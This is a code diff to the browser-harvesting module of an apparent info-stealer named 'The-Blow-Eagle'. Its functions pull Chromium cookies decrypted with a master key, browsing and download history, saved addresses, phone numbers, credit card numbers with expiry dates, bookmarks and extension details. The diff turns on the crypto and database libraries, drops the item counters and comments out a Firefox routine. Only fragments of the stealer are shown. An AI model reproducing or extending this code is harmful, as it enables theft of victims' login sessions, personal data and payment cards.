@@ -20,20 +20,23 @@
 |Autor github: https://github.com/Nick-Vinesmoke                |
 |Original repo: https://github.com/Nick-Vinesmoke/The-Blow-Eagle|
 -----------------------------------------------------------------
-
+*/
 
 #include "../targets.h"
 #include "../../config/config.cpp"
 #include "../../helper/helper.h"
 #include <fstream>
 #include <vector>
-//#include <openssl/evp.h>
-//#include <nlohmann/json.hpp>
+#include <openssl/evp.h>
+#include <nlohmann/json.hpp>
 #include <string>
 #include <windows.h>
 #include <io.h>
-//#include <sodium.h>
+#include <sodium.h>
 #include <wincrypt.h>
+#include <sqlite3.h>
+
+using json = nlohmann::json;
 
 namespace global 
 {
@@ -177,7 +180,6 @@ std::string grab_cookies(std::string path, std::string masterKey, std::string pr
                     cookies += "Path: " + path + "\n";
                     cookies += "Expiration Date: " + date + "\n";
                     cookies += "SameSite: " + samesite + "\n\n";
-                    stats["Cookies"]++;
                 }
             }
 
@@ -233,7 +235,6 @@ std::string grab_history(std::string path, std::string profile) {
                 history += "Visit Count: " + std::to_string(visit_count) + "\n";
                 history += "Typed Count: " + std::to_string(typed_count) + "\n";
                 history += "Last Visit Time: " + std::string(std::ctime(&last_visit_time)) + "\n\n";
-                stats["History"]++;
             }
 
             sqlite3_finalize(stmt);
@@ -336,7 +337,6 @@ std::string grab_downhistory(std::string path, std::string profile) {
                 downhistory += "Original Mime Type: " + original_mime_type + "\n";
                 downhistory += "State: " + state + "\n";
                 downhistory += "Opened: " + opened + "\n\n";
-                stats["Download history"]++;
             }
             sqlite3_finalize(stmt);
             sqlite3_close(db);
@@ -396,7 +396,6 @@ std::string grab_misc(std::string path, std::string masterKey, std::string profi
             misc += "City: " + city + "\n";
             misc += "State: " + state + "\n";
             misc += "Zipcode: " + std::to_string(zipcode) + "\n\n";
-            stats["Addresses"]++;
         }
 
         sqlite3_finalize(stmt);
@@ -412,7 +411,6 @@ std::string grab_misc(std::string path, std::string masterKey, std::string profi
         while (sqlite3_step(stmt) == SQLITE_ROW) {
             std::string phonenumber(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0)));
             misc += "Phone number: " + phonenumber + "\n\n";
-            stats["Phones"]++;
         }
 
         sqlite3_finalize(stmt);
@@ -436,7 +434,6 @@ std::string grab_misc(std::string path, std::string masterKey, std::string profi
             misc += "Expiration Month: " + expiration_month + "\n";
             misc += "Expiration Year: " + expiration_year + "\n";
             misc += "Card Number: " + ccnumber + "\n";
-            stats["Cards"]++;
         }
 
         sqlite3_finalize(stmt);
@@ -464,7 +461,6 @@ std::string grab_bookmarks(std::string path, std::string profile) {
                         std::string url = bookmark["url"];
                         bookmarks_info += "Name: " + name + "\n";
                         bookmarks_info += "URL: " + url + "\n\n";
-                        stats["Bookmarks"]++;
                     } catch (...) {}
                 }
             } catch (...) {}
@@ -477,7 +473,6 @@ std::string grab_bookmarks(std::string path, std::string profile) {
                         std::string url = bookmark["url"];
                         bookmarks_info += "Name: " + name + "\n";
                         bookmarks_info += "URL: " + url + "\n\n";
-                        stats["Bookmarks"]++;
                     } catch (...) {}
                 }
             } catch (...) {}
@@ -490,7 +485,6 @@ std::string grab_bookmarks(std::string path, std::string profile) {
                         std::string url = bookmark["url"];
                         bookmarks_info += "Name: " + name + "\n";
                         bookmarks_info += "URL: " + url + "\n\n";
-                        stats["Bookmarks"]++;
                     } catch (...) {}
                 }
             } catch (...) {}
@@ -513,8 +507,7 @@ std::vector<ExtensionInfo> grab_ext(const std::string& path, std::string profile
   if ((dir = opendir(extension_folder.c_str())) != NULL) {
     while ((ent = readdir(dir)) != NULL) {
       if (ent->d_name[0] == '.' || ent->d_name[0] == '_') continue;  // skip hidden files/folders and names starting with '_'
-      const std::string extension_path =
-          extension_folder + "/" + ent->d_name;
+      const std::string extension_path = extension_folder + "/" + ent->d_name;
       DIR* version_dir;
       struct dirent* version_ent;
       if ((version_dir = opendir(extension_path.c_str())) != NULL) {
@@ -539,7 +532,6 @@ std::vector<ExtensionInfo> grab_ext(const std::string& path, std::string profile
             extension_info.permissions.push_back(permission);
           }
           extension_info_list.push_back(extension_info);
-          stats["Extensions"]++;
         }
         closedir(version_dir);
       } else {
@@ -609,6 +601,7 @@ void browsers::Chromium()
     }
 }
 
+/*
 void browsers::FireFox()
 {
     std::string path = global::roaming + "/Mozilla/Firefox/Profiles";
@@ -623,6 +616,4 @@ void browsers::FireFox()
 
     }
 }
-
-
 */
